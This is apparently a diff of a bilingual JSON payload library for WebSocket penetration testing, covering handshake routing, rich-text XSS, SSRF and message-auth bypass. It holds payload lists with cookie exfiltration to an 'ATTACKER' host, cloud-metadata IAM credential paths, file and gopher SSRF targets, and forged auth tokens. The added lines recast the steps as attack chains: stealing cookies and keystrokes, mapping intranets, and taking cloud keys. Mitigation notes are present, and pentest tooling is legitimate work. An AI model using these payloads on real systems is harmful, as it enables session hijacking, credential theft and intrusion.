+            "zh": "逐条注入端口变体、域拼接、Host 置 null 与已废弃的 Sec-WebSocket-Origin 头；任一变体完成握手即确认路由校验存在缺陷。",
+            "en": "Inject port variants, domain joins, Host: null and the deprecated Sec-WebSocket-Origin one by one; any completed handshake exposes the routing flaw."
           },
-          "payload": "Host: target.com:443\nHost: target.com:80\nHost: target.com:8080\nHost: target.com.evil.com\nHost: null\nSec-WebSocket-Origin: https://evil.com\nSec-WebSocket-Origin: null\nSec-WebSocket-Origin: https://target.com.evil.com"
-        },
-        {
-          "title": {
-            "zh": "核对WebSocket 握手路由阳性边界",
-            "en": "Verify WebSocket Handshake Routing positive boundaries"
-          },
-          "description": {
-            "zh": "阳性要求请求被路由到非预期服务且获得不应有的会话/消息权限；101、不同证书错误或旧头被忽略都不足。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Positive evidence requires routing to an unintended service with unauthorized session or message capability; a 101 response, certificate error difference, or ignored legacy header is insufficient. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归WebSocket 握手路由",
-            "en": "Remediate and regress WebSocket Handshake Routing"
+            "zh": "劫持握手到非预期服务",
+            "en": "Route the handshake to the wrong service"
           },
           "description": {
-            "zh": "代理和应用使用一致的规范 Host/Origin 允许列表，绑定 Upgrade 到预期虚拟主机，忽略旧式头并在消息层重新授权。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Use consistent canonical Host and Origin allowlists across proxy and application, bind Upgrade to the intended virtual host, ignore legacy headers, and authorize again at message level. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "把握手路由到内部或相邻虚拟主机并在该上下文建立会话；获得本不该有的消息权限即完成 WebSocket 握手路由劫持。",
+            "en": "Steer the handshake to an internal or sibling vhost and establish the session there; message permissions you should never have complete the hijack."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         }
       ],
@@ -1256,63 +1258,60 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "WebSocket 富文本 XSS 上下文探针聚焦24 行比基础 WebSocket XSS 卡增加链接/交互/SVG/data 与 Cookie 外传形式，必须按最终输出上下文选择，不能批量投递。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "WebSocket Rich-Text XSS Context Probes focuses on this boundary: The 24 lines add links, interaction events, SVG, data URLs, and cookie-exfiltration forms beyond basic WebSocket XSS and must be selected by final output context rather than sent in bulk. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "覆盖 WebSocket 富文本上下文的 XSS 验证：覆盖 chat/send/message/data 信封、交互事件、SVG/data URL 与 Cookie 外传形态，验证富文本在不同 DOM 上下文的编码缺失。",
+          "en": "Covers XSS verification in WebSocket rich-text contexts: spanning chat/send/message/data envelopes, interaction events, SVG/data URLs, and cookie-exfiltration forms, testing missing encoding of rich text across DOM contexts."
         },
         "vulnerability": {
-          "zh": "消息在存储、广播或客户端重放时进入与其编码不匹配的富文本 sink，允许事件属性、危险 URL 或 SVG 脚本执行。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "Messages enter a rich-text sink with mismatched encoding during storage, broadcast, or client replay, allowing event attributes, dangerous URLs, or SVG script execution. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因是消息在存储、广播或客户端重放时进入与其编码不匹配的富文本 sink，允许事件属性、危险 URL 或 SVG 脚本执行；需按最终输出上下文选择样例而非批量投递。",
+          "en": "The root cause is messages entering rich-text sinks mismatched with their encoding during storage, broadcast, or client replay, permitting event attributes, hazardous URLs, or SVG script execution; samples must be chosen per final output context rather than sprayed."
         },
         "exploitation": {
-          "zh": "先用纯文本定位上下文，只选择一个无网络标记变体并与消毒/编码对照，分别观察发送端和接收端。 阳性是接收浏览器在对应 sink 执行本地标记；Cookie URL 出现在日志、CSP 阻断报告、HTML 被显示为文本或外部请求失败都不是成功。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Locate the context with plaintext, select one networkless marker variant with a sanitized or encoded control, and observe sender and receiver separately. Positive evidence is local marker execution in the matching sink on the receiving browser; cookie URLs in logs, CSP reports, HTML shown as text, or failed external requests are not success. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "使用第 1 步命令经 WebSocket 注入富文本上下文与外发载荷；格式化渲染后执行或 {ATTACKER_HOST} 收到 cookie 即确认富文本上下文 XSS 成立，{ATTACKER_HOST} 渲染为隔离收集器。先用纯文本定位上下文，只选择一个无网络标记变体并与消毒/编码对照，分别观察发送端与接收端。",
+          "en": "Use the step 1 command to inject rich-text contexts and exfiltration payloads via WebSocket; execution after formatted rendering or {ATTACKER_HOST} receiving cookies confirms rich-text context XSS, with {ATTACKER_HOST} rendered as an isolated collector. Locate the context with plain text first, choose a single network-free marker variant contrasted against sanitization/encoding, and observe sender and receiver sides separately."
         },
         "mitigation": {
-          "zh": "对每个字段执行 context-aware 编码，富文本采用严格允许列表消毒，拒绝 javascript/data 协议并部署无 unsafe-inline 的 CSP。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Apply context-aware encoding per field, sanitize rich text with a strict allowlist, reject javascript and data schemes, and deploy CSP without unsafe-inline. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "对每个字段执行 context-aware 编码，富文本采用严格允许列表消毒，拒绝 javascript/data 协议并部署无 unsafe-inline 的 CSP；修复后重放对照应保留合法功能且执行消失。",
+          "en": "Apply context-aware encoding per field, sanitize rich text with strict allowlists, reject javascript/data schemes, and deploy CSP without unsafe-inline; after the fix, replaying controls must preserve legitimate functionality with execution gone."
         },
         "difficulty": "expert"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认WebSocket 富文本上下文 XSS前置条件",
-            "en": "Confirm WebSocket Rich-Text Context XSS prerequisites"
+            "zh": "富文本上下文提交协议载荷",
+            "en": "Submit scheme payloads into rich-text contexts"
           },
           "description": {
-            "zh": "24 行比基础 WebSocket XSS 卡增加链接/交互/SVG/data 与 Cookie 外传形式，必须按最终输出上下文选择，不能批量投递。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "The 24 lines add links, interaction events, SVG, data URLs, and cookie-exfiltration forms beyond basic WebSocket XSS and must be selected by final output context rather than sent in bulk. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "向富文本消息提交伪协议框架源载荷，观察内容区是否按 HTML 渲染执行，命中即存在消息通道侧脚本注入。",
+            "en": "Post iframe javascript: sources into rich-text messages; HTML-style rendering in the feed indicates WS-side XSS."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控WebSocket 富文本上下文 XSS对照",
-            "en": "Run a controlled WebSocket Rich-Text Context XSS comparison"
+            "zh": "事件属性变体扩大命中",
+            "en": "Widen hits with event-attribute variants"
           },
           "description": {
-            "zh": "先用纯文本定位上下文，只选择一个无网络标记变体并与消毒/编码对照，分别观察发送端和接收端。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Locate the context with plaintext, select one networkless marker variant with a sanitized or encoded control, and observe sender and receiver separately. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "补充链接跳转与悬浮事件属性载荷，受害者交互时触发弹窗，确认多标签上下文均可注入并执行攻击代码，攻击面随之扩大。",
+            "en": "Add a-href and div onmouseover variants; hover-triggered alerts prove multiple tag contexts execute injected markup."
           },
-          "payload": "{\"type\":\"message\",\"content\":\"<iframe src=javascript:alert(1)>\"}\n{\"type\":\"message\",\"content\":\"<a href=javascript:alert(1)>click</a>\"}\n{\"type\":\"message\",\"content\":\"<div onmouseover=alert(1)>hover</div>\"}\n{\"type\":\"message\",\"content\":\"<button onclick=alert(1)>click</button>\"}\n{\"type\":\"chat\",\"message\":\"<script>alert(1)</script>\"}\n{\"type\":\"chat\",\"message\":\"<img src=x onerror=alert(1)>\"}\n{\"type\":\"chat\",\"message\":\"<svg onload=alert(1)>\"}\n{\"type\":\"chat\",\"message\":\"<details open ontoggle=alert(1)>\"}\n{\"type\":\"chat\",\"message\":\"<input onfocus=alert(1) autofocus>\"}\n{\"type\":\"chat\",\"message\":\"<body onload=alert(1)>\"}\n{\"action\":\"send\",\"message\":\"<script>alert(1)</script>\"}\n{\"action\":\"send\",\"message\":\"<img src=x onerror=alert(1)>\"}\n{\"action\":\"send\",\"message\":\"<svg onload=alert(1)>\"}\n{\"action\":\"send\",\"data\":\"<script>alert(1)</script>\"}\n{\"action\":\"send\",\"data\":\"<img src=x onerror=alert(1)>\"}\n{\"action\":\"send\",\"data\":\"<svg onload=alert(1)>\"}\n{\"action\":\"send\",\"data\":\"<details open ontoggle=alert(1)>\"}\n{\"action\":\"send\",\"data\":\"<input onfocus=alert(1) autofocus>\"}\n{\"type\":\"message\",\"content\":\"<script>fetch('http://ATTACKER/?c='+document.cookie)</script>\"}\n{\"type\":\"message\",\"content\":\"<script>navigator.sendBeacon('http://ATTACKER/',document.cookie)</script>\"}\n{\"type\":\"message\",\"content\":\"<iframe src=\\\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">\"}\n{\"type\":\"message\",\"content\":\"<svg><script>alert(1)</script></svg>\"}\n{\"type\":\"message\",\"content\":\"<svg/onload=alert(1)>\"}\n{\"type\":\"message\",\"content\":\"<svg><animate onbegin=alert(1) attributeName=x dur=1s>\"}"
-        },
-        {
-          "title": {
-            "zh": "核对WebSocket 富文本上下文 XSS阳性边界",
-            "en": "Verify WebSocket Rich-Text Context XSS positive boundaries"
-          },
-          "description": {
-            "zh": "阳性是接收浏览器在对应 sink 执行本地标记；Cookie URL 出现在日志、CSP 阻断报告、HTML 被显示为文本或外部请求失败都不是成功。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Positive evidence is local marker execution in the matching sink on the receiving browser; cookie URLs in logs, CSP reports, HTML shown as text, or failed external requests are not success. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归WebSocket 富文本上下文 XSS",
-            "en": "Remediate and regress WebSocket Rich-Text Context XSS"
+            "zh": "接入窃取与钓鱼利用",
+            "en": "Chain into theft and phishing"
           },
           "description": {
-            "zh": "对每个字段执行 context-aware 编码，富文本采用严格允许列表消毒，拒绝 javascript/data 协议并部署无 unsafe-inline 的 CSP。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Apply context-aware encoding per field, sanitize rich text with a strict allowlist, reject javascript and data schemes, and deploy CSP without unsafe-inline. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "以可执行上下文为基础注入外带脚本或伪装输入框，窃取 Cookie 与输入内容，把消息通道变成攻击跳板。",
+            "en": "With execution established, plant beacons or fake inputs to steal cookies and keystrokes, turning the feed into the attack pivot."
           }
         }
       ],
@@ -1382,63 +1381,64 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "WebSocket 驱动的服务端请求伪造聚焦36 行覆盖多个业务字段和 scheme；核心分类是服务器代发请求，但 command 字段若被 Shell 执行需另按 RCE 证据判断。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "WebSocket-Driven Server-Side Request Forgery focuses on this boundary: The 36 lines cover multiple business fields and schemes; the core category is server-side request dispatch, while command fields require separate RCE evidence if executed by a shell. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "WebSocket 驱动的服务端请求伪造覆盖 WS 消息调度场景：针对经 WebSocket 接收 request/fetch/proxy/url 等字段的后端，验证回环、元数据、file 与 gopher 目标能否被服务器代为访问。验证维度涵盖外部标记确认、逐字段测试与出站日志关联三类。",
+          "en": "WebSocket-Driven Server-Side Request Forgery covers WS-message dispatch: for backends accepting request/fetch/proxy/url fields over WebSocket, verify whether loopback, metadata, file, and gopher targets get fetched by the server. Verification dimensions cover external-marker confirmation, per-field testing, and egress-log correlation."
         },
         "vulnerability": {
-          "zh": "WebSocket 消息中的 URL/目标未经过协议、解析后地址和重定向校验，worker 以服务器网络身份访问内部资源。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "URL or target fields in WebSocket messages lack protocol, post-resolution address, and redirect validation, allowing a worker to access internal resources with server network identity. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因是 WebSocket 消息中的 URL 或目标未经协议、解析后地址与重定向校验，worker 以服务器网络身份访问内部资源；command 字段若被 Shell 执行需另按 RCE 证据判断，风险必须落到实际消息 sink 与后端资源。",
+          "en": "The root cause is URLs or targets inside WebSocket messages unvalidated for scheme, resolved address, or redirects while workers reach internal resources with the server's network identity; command fields executed by a shell must instead be judged under RCE evidence, and risk must land on actual message sinks and backend resources."
         },
         "exploitation": {
-          "zh": "先用外部标记确认后端请求，再选一个回环标记 URL；逐字段测试且不触碰元数据、真实文件或 Redis。 阳性要求后端客户端/出站代理和目标服务记录同一令牌；WebSocket ACK、浏览器请求、连接超时或 command 字符串被存储都不够。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Confirm backend fetching with an external marker, then select one loopback marker URL, testing one field at a time without touching metadata, real files, or Redis. Positive evidence requires the backend client or egress proxy and target service to record the same token; a WebSocket acknowledgment, browser request, timeout, or stored command string is insufficient. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "按 Payload 列表顺序使用：第 1 步先用外部标记确认后端会按消息发起请求；再选一个回环标记 URL 逐字段测试（type:request、fetch、proxy 等），阳性要求后端客户端/出站代理与目标服务记录同一令牌；含 file 或 gopher 的消息确认协议转发。不触碰元数据、真实文件或 Redis。WebSocket ACK、浏览器请求、连接超时或 command 字符串被存储都不够。占位符在全局变量菜单中替换。",
+          "en": "Use in Payload list order: step 1 first confirms the backend fetches per message via an external marker; then test a loopback marker URL field by field (type:request, fetch, proxy, etc.) — a positive requires the backend client/egress proxy and target service recording the same token; messages carrying file or gopher confirm protocol forwarding. Never touch metadata, real files, or Redis. WebSocket ACKs, browser requests, connection timeouts, or stored command strings are insufficient. Replace placeholders via the global variables menu."
         },
         "mitigation": {
-          "zh": "对动作和字段做 schema 允许列表，仅允许 HTTPS 目标；解析后阻断内网/回环/链路本地，禁用 file/gopher，并在重定向后重检。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Allowlist actions and fields and permit only HTTPS destinations; block internal, loopback, and link-local addresses after resolution, disable file and gopher, and revalidate redirects. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "对动作与字段做 schema 允许列表，仅允许 HTTPS 目标；解析后阻断内网、回环与链路本地，禁用 file/gopher 并在重定向后重检。修复后重放相同对照，合法 WebSocket 功能保留而越权取回能力消失。",
+          "en": "Apply schema allowlists over actions and fields, allowing only HTTPS targets; block intranets, loopback, and link-local after resolution, disable file/gopher, and recheck after redirects. After the fix, replay the same controls: legitimate WebSocket features remain while unauthorized fetching disappears."
         },
         "difficulty": "expert"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认WebSocket 服务端请求调度前置条件",
-            "en": "Confirm WebSocket Server-Side Request Dispatch prerequisites"
+            "zh": "建立 WebSocket 驱动服务端请求",
+            "en": "Drive server requests over WebSocket"
           },
           "description": {
-            "zh": "36 行覆盖多个业务字段和 scheme；核心分类是服务器代发请求，但 command 字段若被 Shell 执行需另按 RCE 证据判断。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "The 36 lines cover multiple business fields and schemes; the core category is server-side request dispatch, while command fields require separate RCE evidence if executed by a shell. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "连接目标 WebSocket 后发送 {\"type\":\"request\",\"url\":\"http://127.0.0.1/\"} 消息；服务端返回对应响应体即 WS 消息可充当 SSRF 通道。",
+            "en": "Connect to the target's WebSocket and send a {\"type\":\"request\",\"url\":\"http://127.0.0.1/\"} message; the server returning the fetched body makes WS messages an SSRF channel."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控WebSocket 服务端请求调度对照",
-            "en": "Run a controlled WebSocket Server-Side Request Dispatch comparison"
+            "zh": "模板替换批量扫内网",
+            "en": "Sweep the intranet by template swaps"
           },
           "description": {
-            "zh": "先用外部标记确认后端请求，再选一个回环标记 URL；逐字段测试且不触碰元数据、真实文件或 Redis。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Confirm backend fetching with an external marker, then select one loopback marker URL, testing one field at a time without touching metadata, real files, or Redis. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "沿用第 1 步消息模板替换 8080、3306、6379 等端口与内网 IP；按返回 banner 差异绘制内网服务地图。",
+            "en": "Reuse the step-1 message template with ports 8080, 3306, 6379 and intranet IPs; banner differences map the internal services."
           },
-          "payload": "{\"type\":\"request\",\"url\":\"http://127.0.0.1/\"}\n{\"type\":\"request\",\"url\":\"http://127.0.0.1:8080/\"}\n{\"type\":\"request\",\"url\":\"http://127.0.0.1:3306/\"}\n{\"type\":\"request\",\"url\":\"http://127.0.0.1:6379/\"}\n{\"type\":\"request\",\"url\":\"http://127.0.0.1:27017/\"}\n{\"type\":\"request\",\"url\":\"http://127.0.0.1:9200/\"}\n{\"type\":\"request\",\"url\":\"http://127.0.0.1:5432/\"}\n{\"type\":\"request\",\"url\":\"http://localhost/\"}\n{\"type\":\"request\",\"url\":\"http://0.0.0.0/\"}\n{\"type\":\"request\",\"url\":\"http://[::1]/\"}\n{\"type\":\"request\",\"url\":\"http://169.254.169.254/latest/meta-data/\"}\n{\"type\":\"request\",\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}\n{\"type\":\"request\",\"url\":\"file:///etc/passwd\"}\n{\"type\":\"request\",\"url\":\"file:///flag\"}\n{\"type\":\"request\",\"url\":\"file:///proc/self/environ\"}\n{\"type\":\"request\",\"url\":\"gopher://127.0.0.1:6379/_INFO%0d%0a\"}\n{\"action\":\"fetch\",\"url\":\"http://127.0.0.1/\"}\n{\"action\":\"fetch\",\"url\":\"http://169.254.169.254/latest/meta-data/\"}\n{\"action\":\"fetch\",\"url\":\"file:///etc/passwd\"}\n{\"action\":\"proxy\",\"target\":\"http://127.0.0.1/\"}\n{\"action\":\"proxy\",\"target\":\"http://169.254.169.254/latest/meta-data/\"}\n{\"action\":\"proxy\",\"target\":\"http://192.168.1.1/\"}\n{\"action\":\"proxy\",\"target\":\"http://10.0.0.1/\"}\n{\"action\":\"proxy\",\"target\":\"http://172.16.0.1/\"}\n{\"command\":\"curl http://127.0.0.1/\"}\n{\"command\":\"curl http://169.254.169.254/latest/meta-data/\"}\n{\"command\":\"wget http://127.0.0.1/\"}\n{\"command\":\"wget http://169.254.169.254/latest/meta-data/\"}\n{\"url\":\"http://127.0.0.1/\"}\n{\"url\":\"http://169.254.169.254/latest/meta-data/\"}\n{\"url\":\"file:///etc/passwd\"}\n{\"url\":\"gopher://127.0.0.1:6379/_INFO%0d%0a\"}\n{\"uri\":\"http://127.0.0.1/\"}\n{\"uri\":\"http://169.254.169.254/latest/meta-data/\"}\n{\"endpoint\":\"http://127.0.0.1/\"}\n{\"endpoint\":\"http://169.254.169.254/latest/meta-data/\"}"
-        },
-        {
-          "title": {
-            "zh": "核对WebSocket 服务端请求调度阳性边界",
-            "en": "Verify WebSocket Server-Side Request Dispatch positive boundaries"
-          },
-          "description": {
-            "zh": "阳性要求后端客户端/出站代理和目标服务记录同一令牌；WebSocket ACK、浏览器请求、连接超时或 command 字符串被存储都不够。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Positive evidence requires the backend client or egress proxy and target service to record the same token; a WebSocket acknowledgment, browser request, timeout, or stored command string is insufficient. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归WebSocket 服务端请求调度",
-            "en": "Remediate and regress WebSocket Server-Side Request Dispatch"
+            "zh": "深入云元数据窃取凭证",
+            "en": "Reach cloud metadata for keys"
           },
           "description": {
-            "zh": "对动作和字段做 schema 允许列表，仅允许 HTTPS 目标；解析后阻断内网/回环/链路本地，禁用 file/gopher，并在重定向后重检。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Allowlist actions and fields and permit only HTTPS destinations; block internal, loopback, and link-local addresses after resolution, disable file and gopher, and revalidate redirects. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "把 url 字段换成云元数据 iam/security-credentials 凭证路径；响应含 AccessKeyId 即借 WS 通道拖取实例角色凭证。",
+            "en": "Swap the url field to the iam/security-credentials metadata path; AccessKeyId in the response completes cloud credential theft over the WS channel."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         }
       ],
@@ -1534,63 +1534,64 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "WebSocket 消息级认证与授权绕过聚焦22 行覆盖 token 类型、method、用户名/口令和会话字段，目标是认证状态机与消息授权，不是 XSS。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "WebSocket Message-Level Authentication and Authorization Bypass focuses on this boundary: The 22 lines cover token types, methods, username or password, and session fields and target authentication state and message authorization rather than XSS. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "该 Payload 覆盖 WebSocket 消息级认证与授权场景，检验连接后每条消息的主体校验与类型处理。验证维度为空值、类型混淆与弱凭据消息的提交矩阵，对应第 1 步。",
+          "en": "This payload covers WebSocket message-level authentication and authorization, testing per-message principal validation and type handling after connection. Validation is a submission matrix of empty, type-confused and weak-credential messages, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "处理器对空值/字符串 null/弱凭据做宽松真值转换，或连接建立后未将每条消息重新绑定到已认证主体。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "The handler loosely coerces empty values or string null and weak credentials, or fails to bind every post-connection message to the authenticated principal. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因在于授权只在连接建立时执行而消息处理器直接信任载荷：伪造 auth 消息或类型混淆值让会话在连接内被提升或读取受限数据。",
+          "en": "The root cause is authorization running only at connection setup while message handlers trust payloads outright: forged auth messages or type-confused values elevate sessions in-connection or expose restricted data."
         },
         "exploitation": {
-          "zh": "先建立未认证、低权限和高权限基线，再一次测试一种类型/方法变体并读取服务器端主体，最后尝试一项无副作用授权查询。 阳性要求无效/低权限输入被绑定为更高权限主体并获得对象访问；auth ACK、连接保持、通用欢迎消息或错误文本变化都不够。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Establish unauthenticated, low-, and high-privilege baselines, test one type or method variant at a time, inspect the server principal, and perform one side-effect-free authorization query. Positive evidence requires invalid or low-privilege input to bind as a more privileged principal and gain object access; an auth acknowledgment, open connection, generic welcome, or changed error text is insufficient. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "第 1 步按脚本把空值、null、字符串化布尔与角色提升消息逐条经既有连接发送，记录服务端响应与会话状态变化：任一伪造消息被接受或返回受限数据即确认消息级授权缺失。成功判据以响应与状态变化为准。占位符在全局变量菜单替换。",
+          "en": "In step 1, send empty, null, stringified-boolean and role-elevation messages one by one over the existing connection per the script, recording server responses and session-state changes; any forged message accepted or restricted data returned confirms missing message-level authorization. Judge success by responses and state changes. Replace placeholders via the global variables menu."
         },
         "mitigation": {
-          "zh": "对 schema 和类型严格验证，使用成熟认证流程，轮换会话，并在每条消息按主体、对象和动作执行服务端授权。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Validate schema and types strictly, use a mature authentication flow, rotate sessions, and enforce server-side subject, object, and action authorization on every message. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "每条消息都对照连接主体执行授权并拒绝类型异常载荷，auth 类消息绑定一次性挑战。修复后重放第 1 步矩阵，全部伪造消息应被拒绝并断开计数。",
+          "en": "Authorize every message against the connection principal and refuse type-anomalous payloads, binding auth messages to one-time challenges. After the fix, replay the step 1 matrix: every forged message should be rejected with disconnect tallies."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认WebSocket 消息认证前置条件",
-            "en": "Confirm WebSocket Message Authentication prerequisites"
+            "zh": "建立未认证连接",
+            "en": "Open an unauthenticated connection"
           },
           "description": {
-            "zh": "22 行覆盖 token 类型、method、用户名/口令和会话字段，目标是认证状态机与消息授权，不是 XSS。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "The 22 lines cover token types, methods, username or password, and session fields and target authentication state and message authorization rather than XSS. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "直连 WS 端点观察握手是否强制认证；连接成功并收到欢迎消息即说明鉴权推迟到消息层，进入消息级攻击阶段。",
+            "en": "Connect directly and see whether the handshake enforces auth; a socket that opens and greets means auth lives in the message layer."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控WebSocket 消息认证对照",
-            "en": "Run a controlled WebSocket Message Authentication comparison"
+            "zh": "发送伪造认证消息",
+            "en": "Send forged auth messages"
           },
           "description": {
-            "zh": "先建立未认证、低权限和高权限基线，再一次测试一种类型/方法变体并读取服务器端主体，最后尝试一项无副作用授权查询。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Establish unauthenticated, low-, and high-privilege baselines, test one type or method variant at a time, inspect the server principal, and perform one side-effect-free authorization query. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "逐条提交空 token、null、undefined、0 等类型混淆与字段篡改的认证消息；服务端把无效身份绑定为高权限主体即消息级授权缺失。",
+            "en": "Submit auth messages with empty, null, undefined and 0 tokens plus field tampering; a server binding invalid input to a privileged subject lacks message-level authz."
           },
-          "payload": "{\"type\":\"auth\",\"token\":\"\"}\n{\"type\":\"auth\",\"token\":null}\n{\"type\":\"auth\",\"token\":\"null\"}\n{\"type\":\"auth\",\"token\":\"undefined\"}\n{\"type\":\"auth\",\"token\":\"false\"}\n{\"type\":\"auth\",\"token\":\"0\"}\n{\"type\":\"auth\",\"token\":\"-1\"}\n{\"type\":\"auth\",\"token\":\"admin\"}\n{\"type\":\"auth\",\"token\":\"test\"}\n{\"type\":\"auth\",\"token\":\"Bearer null\"}\n{\"type\":\"auth\",\"method\":\"none\"}\n{\"type\":\"auth\",\"method\":\"basic\",\"username\":\"admin\",\"password\":\"admin\"}\n{\"type\":\"auth\",\"method\":\"bearer\",\"token\":\"admin\"}\n{\"type\":\"login\",\"username\":\"admin\",\"password\":\"admin\"}\n{\"type\":\"login\",\"username\":\"admin\",\"password\":\"\"}\n{\"type\":\"login\",\"username\":\"admin\",\"password\":\"null\"}\n{\"type\":\"login\",\"username\":\"admin\",\"password\":\"password\"}\n{\"action\":\"auth\",\"token\":\"\"}\n{\"action\":\"auth\",\"token\":null}\n{\"action\":\"login\",\"user\":\"admin\",\"pass\":\"admin\"}\n{\"type\":\"auth\",\"session\":\"STOLEN_SESSION_ID\"}\n{\"type\":\"auth\",\"cookie\":\"session=STOLEN_SESSION\"}"
-        },
-        {
-          "title": {
-            "zh": "核对WebSocket 消息认证阳性边界",
-            "en": "Verify WebSocket Message Authentication positive boundaries"
-          },
-          "description": {
-            "zh": "阳性要求无效/低权限输入被绑定为更高权限主体并获得对象访问；auth ACK、连接保持、通用欢迎消息或错误文本变化都不够。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Positive evidence requires invalid or low-privilege input to bind as a more privileged principal and gain object access; an auth acknowledgment, open connection, generic welcome, or changed error text is insufficient. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归WebSocket 消息认证",
-            "en": "Remediate and regress WebSocket Message Authentication"
+            "zh": "以提升身份调用受保护操作",
+            "en": "Invoke protected actions as the elevated identity"
           },
           "description": {
-            "zh": "对 schema 和类型严格验证，使用成熟认证流程，轮换会话，并在每条消息按主体、对象和动作执行服务端授权。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Validate schema and types strictly, use a mature authentication flow, rotate sessions, and enforce server-side subject, object, and action authorization on every message. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "用第 2 步获得的会话身份调用管理类消息或读取他人数据；操作成功返回即完成 WebSocket 消息级越权，量化可访问的数据范围。",
+            "en": "Using the session minted in step 2, call admin messages or read other users' data; successful responses complete the message-level privilege escalation."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         }
       ],
@@ -1660,63 +1661,64 @@
       ],
       "tutorial": {
         "overview": {
